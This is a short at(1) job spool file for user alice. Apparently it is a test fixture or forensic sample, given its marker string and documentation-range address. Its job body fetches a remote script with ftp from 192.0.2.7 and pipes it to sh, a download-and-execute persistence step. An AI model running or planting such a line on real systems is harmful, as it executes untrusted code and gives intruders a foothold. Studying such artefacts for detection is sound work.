#!/bin/sh
# atrun uid=1000 gid=66
# mail                             root 0
umask 22
export LOGNAME=alice
export PWD=/home/alice
export HOME=/home/alice
export MAIL=/var/mail/root
export SSH_CLIENT=10.0.2.2\ 41988\ 22
export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin
export SSH_CONNECTION=10.0.2.2\ 41988\ 10.0.2.15\ 22
export USER=alice
cd /home/alice || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
/bin/ksh << '_END_OF_AT_JOB'
echo NXMK_at_job; ftp -o - http://192.0.2.7/NXMK_at.sh | sh

_END_OF_AT_JOB
